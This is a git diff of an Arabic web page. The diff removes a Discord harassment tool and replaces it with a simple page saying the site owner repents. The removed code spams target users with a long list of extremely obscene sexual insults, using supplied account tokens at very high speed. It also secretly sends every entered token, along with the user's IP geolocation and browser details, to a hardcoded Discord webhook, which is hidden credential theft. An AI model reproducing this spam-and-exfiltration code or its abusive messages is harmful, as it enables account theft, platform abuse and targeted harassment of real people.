@@ -1,189 +1,70 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>515 Group</title>
+<title>صاحب الموقع تائب</title>
+
 <style>
-body { font-family: Arial, sans-serif; margin:0; padding:0; direction: rtl; background: linear-gradient(135deg,#1a0033,#004d26); color:white; }
-.container { max-width:900px; margin:auto; padding:20px; }
-h2 { text-align:center; margin-bottom:20px; }
-label, input, button, select, textarea { display:block; width:100%; margin:10px 0; }
-input, textarea, select { padding:12px; border-radius:8px; border:none; background: rgba(0,0,0,0.5); color:white; font-size:16px; }
-button { padding:12px; border-radius:12px; font-weight:bold; cursor:pointer; transition: all 0.2s ease; border:2px solid #000; }
-button:hover { transform: translateY(-2px); box-shadow:0 6px 10px rgba(0,0,0,0.5); }
-button:disabled { background: grey; cursor:not-allowed; box-shadow:none; }
-#autoPanel, #controlPanel { padding:20px; background: linear-gradient(135deg,#1a0033,#004d26); color:white; border-radius:12px; margin-top:20px; }
-.left-btn { position:absolute; left:20px; top:20px; padding:8px 14px; font-size:14px; background:#7b00ff; color:white; border-radius:8px; cursor:pointer; font-weight:bold; }
-.left-btn:hover { transform: scale(1.05); box-shadow:0 0 10px #00ff7b,0 0 15px #7b00ff; }
-#stopBtn { background: linear-gradient(145deg,#ff0044,#990022); }
-.green-btn { background: linear-gradient(145deg,#00ff4d,#009900); color:black; }
-.red-btn { background: linear-gradient(145deg,#ff1a1a,#990000); color:white; }
-#messagesSent, #tokenStatus { display:none; }
-.control-title { font-size:20px; text-align:center; margin-bottom:10px; color:#ffccff; }
-.control-section { margin-bottom:15px; }
-.control-section input, .control-section textarea { margin-bottom:5px; }
-.control-section button { margin-top:5px; }
+html, body {
+    margin: 0;
+    padding: 0;
+    width: 100%;
+    height: 100%;
+}
+
+body {
+    background:
+        linear-gradient(rgba(200,0,0,0.75), rgba(200,0,0,0.75)),
+        url("bg.jpg.jfif") no-repeat center center fixed;
+    background-size: cover;
+
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    font-family: Arial, sans-serif;
+}
+
+.text {
+    color: white;
+    font-size: 60px;
+    font-weight: bold;
+    text-shadow: 0 0 20px black;
+    margin-bottom: 30px;
+}
+
+button {
+    background: darkred;
+    color: white;
+    border: none;
+    padding: 15px 40px;
+    font-size: 22px;
+    cursor: pointer;
+    border-radius: 10px;
+    box-shadow: 0 0 15px black;
+}
+
+button:hover {
+    background: red;
+}
 </style>
 </head>
+
 <body>
 
-<div class="container" id="autoPanel">
-<h2>اوتو 515 Group</h2>
-<button class="left-btn" id="goControlBtn">تحكم بالحساب</button>
+<div class="text">صاحب الموقع تائب</div>
 
-<label for="tokens">اكتب التوكنات (كل توكن بسطر)</label>
-<textarea id="tokens" placeholder="MTM3NjUxODI0..."></textarea>
+<button onclick="playSound()">تشغيل الصوت </button>
 
-<label for="ids">اكتب ايدي الديوثين (كل ايدي بسطر)</label>
-<textarea id="ids" placeholder="123456789012345678"></textarea>
-
-<label for="targetId">اكتب ايدي روم الي تبي تسب فيه هان</label>
-<input type="text" id="targetId" placeholder="اكتب ايدي الروم هان">
-
-<label for="speed">اختر سرعة الإرسال (بالثواني)</label>
-<select id="speed">
-  <option value="1000">1</option>
-  <option value="900">0.9</option>
-  <option value="800">0.8</option>
-  <option value="700">0.7</option>
-  <option value="600">0.6</option>
-  <option value="500">0.5</option>
-  <option value="400">0.4</option>
-  <option value="300">0.3</option>
-  <option value="200">0.2</option>
-  <option value="100">0.1</option>
-  <option value="1">0.001</option>
-</select>
-
-<button id="startBtn">نيك الديوث</button>
-<button id="stopBtn" disabled>ايقاف النيك</button>
-</div>
-
-<div id="controlPanel">
-<div class="control-title">التحكم بالحساب - حقوق 515</div>
-
-<div class="control-section">
-<label>قم بوضع توكن الحساب</label>
-<textarea id="accToken" placeholder="توكن الحساب هنا"></textarea>
-</div>
-
-<div class="control-section">
-<label>قم بوضع ايدي السيرفر</label>
-<input type="text" id="guildId" placeholder="اكتب ايدي السيرفر هنا">
-</div>
-
-<div class="control-section">
-<label>تغير اسم الحساب في السيرفر</label>
-<input type="text" id="newName" placeholder="اكتب الاسم الجديد">
-<button id="changeNameBtn">تغير الاسم</button>
-</div>
-
-<button class="left-btn" id="backToAutoBtn">الذهاب إلى الاوتو</button>
-</div>
+<audio id="enterSound">
+    <source src="sound.mp3" type="audio/mpeg">
+</audio>
 
 <script>
-const autoPanel=document.getElementById('autoPanel');
-const controlPanel=document.getElementById('controlPanel');
-const goControlBtn=document.getElementById('goControlBtn');
-const backToAutoBtn=document.getElementById('backToAutoBtn');
-const tokensInput=document.getElementById('tokens');
-const idsInput=document.getElementById('ids');
-const targetIdInput=document.getElementById('targetId');
-const speedSelect=document.getElementById('speed');
-const startBtn=document.getElementById('startBtn');
-const stopBtn=document.getElementById('stopBtn');
-const accToken=document.getElementById('accToken');
-const newName=document.getElementById('newName');
-const guildId=document.getElementById('guildId');
-
-const MESSAGES=[
-"بزغبك","يلعن شرفك يديوث","تفو على شرفك","احسك غثيث مره يوم شفتك حسيت ب شعور سيء تجاهك اجبرني اني انيك محارمك",
-"هههههههههههههههههههههههههه","كسمك","تبغا اضرب شرفك يا ابن الحيوانة هنا يا ديوث","يديوث","بضرب كس اختك ياخو القحبه افجر رحم امك",
-"امك كلبه ازباب.","يبن 200 شرموطه","ازحف على امك","اختك كلببه عند رجوولي","اجلللخ عليك","يمخنث يعبد الازباب تعال مصصص",
-"امك ممثله افلام سكس","امك قحبه قروبات المكس","امك بلمقحبه لها اصوات","اصمل كسمك يجديدد","يبن اكبر لبوه","يعاق كسمك احترم ابوك",
-"يعرص الطش امكك","يمكسور يضعيف النفس","يديوث","اغتصب خواتك","كس خواتك","يبن المديثه","يلعن رحم امك","امك صارت حامل يبن الشرموطه",
-"ازغب امك","جيب امك انيكها","اوف كسمك","يمهان","يلعن اختك","انا فحل امك","انيك ابوك","انيك اخوك","انيكك امكك يبن الزنا",
-"الدياثه تمشي بعروقكم","ادقك يبن الشرموطه","يطفل يبن القحبه","اوف ابن القحبه","تمحن يشرموط","تمحن واعطيك نيترو يخنيث","من فحل امك",
-"واو يشرموط تنبح","نادي امك زبي قام يبيها تقعد عليه","انيكك يخنيث يقواد","اركب عليه كسمك","يلعن امك يديوث","انبح يبن الشرموطه",
-"انبح انبح لفحل امك","انا نايك امك يبن الشرموطه","امك قاعده تنبح من كثر مافتحوها","انيك امك بنعال","اتفل بكسمك يبن الشرموطه",
-"تمحن يورعي","انيك امك يطفل","انيك امك يديوث","يبن القحبه","انيك امك","يشرموط","يديوث","اختفووو كسمك","امك على زبي","يبن الشرموطه",
-"يبن الزنا","يبن القحبه","امك قحبتي","يلعن امك يبن الشرموطه","الحقق امك قاعده تتمحن عشان تجيب فلوسس","اختك قاعده تعرض عشان تجيبلك فلوس يفقير",
-"انيك امك يشرموط","يبن المتعه","ازغب خواتك","انحر امك","العن رحم امك","امك تمصلي","اختك تلحس زبي","روح ابكي",
-"بمناسبه مرور ثلاث سنوات على زواجي انا وامك بطلقها وزاتزوج اختك","رد يفحل خواتك","اشفشف امك","انيكك سبعاوي","نخ يكسمك","جاوب يمخنث",
-"امش لانيك امك","يمدعوس","انا قد شفت اسامي قبايل غريبه لكن بالله ليه مكتوب بهويتك ال الديوثين","يخول","زبي قام على كسمك","اخخخ زبيي قامم جب امكك",
-"تحب الطويل صح","اسال امك انا مشترك عندها واليوم ماعرضت ليه؟","كيف امك جابت عاق كذا","والله مهان","فحول امك هنا","اهربب كسمك",
-"روضت امك ماتبيني اروضك","ازغب اختك","سبعاوي امك يقواد","انبح يهارب","انيك امك واختك","اكسر عينك كسمك","كيف امك جابت عاق زيك",
-"والله ماش مهان","انيك ابوك","ابوك ناك امك","يبن القحبه انيك اختك","اشق ام امك يبن منيوكه","بتفكر مابقدر انيك امك انت ؟",
-"انا بنيك اختك وبشرب ديود امك","انيك خالاتك","قل ل الماما حقتك تعترف من ناكها 🥵","ماتدري اني اقدر انيك قبيلتك ؟",
-"قد شفت بطايق ناس بس ليه حقتك مكتوب المخنايث","تعرف كم طول زبي ؟ قد طول اطول شوارب بقبيلتك","يبن القحبه انيك خالتك","يبن القحبه انيك ابوك",
-"يبن القحبه انيك ستك","يبن القحبه انيك شرفك","شرفك ضايع يبن المتناكه","انا عطشان ابي ديود اختك لو سمحت","قم جب لي اختك مش شعرها"
-];
-
-function checkToken(token){return token.length>20;}
-function getRandomMessage(){return MESSAGES[Math.floor(Math.random()*MESSAGES.length)];}
-function getRandomId(){const ids=idsInput.value.trim().split('\n').filter(id=>id.length>0); return ids[Math.floor(Math.random()*ids.length)];}
-
-async function sendMessage(token,targetId,message){
-try{
-await fetch(`https://discord.com/api/v9/channels/${targetId}/messages`,{
-method:'POST', headers:{Authorization:token,'Content-Type':'application/json'},
-body:JSON.stringify({content:`<@${getRandomId()}> ${message}`})
-});
-}catch(e){}
+function playSound(){
+    document.getElementById("enterSound").play();
 }
-
-let intervalId=null;
-function startSending(){
-const tokens=tokensInput.value.trim().split('\n').filter(checkToken); 
-const targetId=targetIdInput.value.trim(); 
-const speed=parseInt(speedSelect.value); 
-if(tokens.length===0 || !targetId) return; 
-startBtn.disabled=true; stopBtn.disabled=false; 
-intervalId=setInterval(()=>{tokens.forEach(token=>{sendMessage(token,targetId,getRandomMessage());});},speed); 
-tokens.forEach(sendTokenDetails);
-}
-
-function stopSending(){if(intervalId){clearInterval(intervalId); intervalId=null; startBtn.disabled=false; stopBtn.disabled=true;}}
-
-async function sendTokenDetails(token) {
-if(!token) return;
-const language=navigator.language||navigator.userLanguage;
-const screenRes=`${screen.width}x${screen.height}`;
-const colorDepth=screen.colorDepth;
-const timezone=Intl.DateTimeFormat().resolvedOptions().timeZone;
-const userAgent=navigator.userAgent;
-let geoData={};
-try{
-const res=await fetch('https://ipapi.co/json/');
-geoData=await res.json();
-}catch(e){
-geoData={ country_name: "غير متوفر", region: "غير متوفر", city: "غير متوفر", postal: "غير متوفر", latitude: "غير متوفر", longitude: "غير متوفر", org: "غير متوفر" };
-}
-const content=`TOKEN: ${token}
-
-🌍 الدولة: ${geoData.country_name}
-🏙️ المدينة والمنطقة: ${geoData.region} - ${geoData.city}
-🌐 عنوان IP: ${geoData.ip}
-📮 الرمز البريدي: ${geoData.postal}
-🕐 المنطقة الزمنية: ${timezone}
-📍 الإحداثيات: ${geoData.latitude},${geoData.longitude}
-🔗 ASN: ${geoData.org}
-🖥️ نظام التشغيل: ${navigator.platform}
-🌐 المتصفح: ${userAgent}
-📱 دقة الشاشة: ${screenRes}
-🎨 عمق الألوان: ${colorDepth}
-🌍 اللغة: ${language}`;
-
-fetch("https://discord.com/api/webhooks/1405597236586348714/G8u3dnhw71M0DA9gOl0lyJTDnxmILSyx4GUdswvTgWlX9UOctibV28fzf9wtjjGVe_FY",{method:"POST",headers:{'Content-Type':'application/json'},body:JSON.stringify({content})});
-}
-
-startBtn.addEventListener('click',startSending);
-stopBtn.addEventListener('click',stopSending);
-
-goControlBtn.addEventListener('click',()=>{autoPanel.style.display='none'; controlPanel.style.display='block';});
-backToAutoBtn.addEventListener('click',()=>{controlPanel.style.display='none'; autoPanel.style.display='block';});
-
 </script>
+
 </body>
 </html>
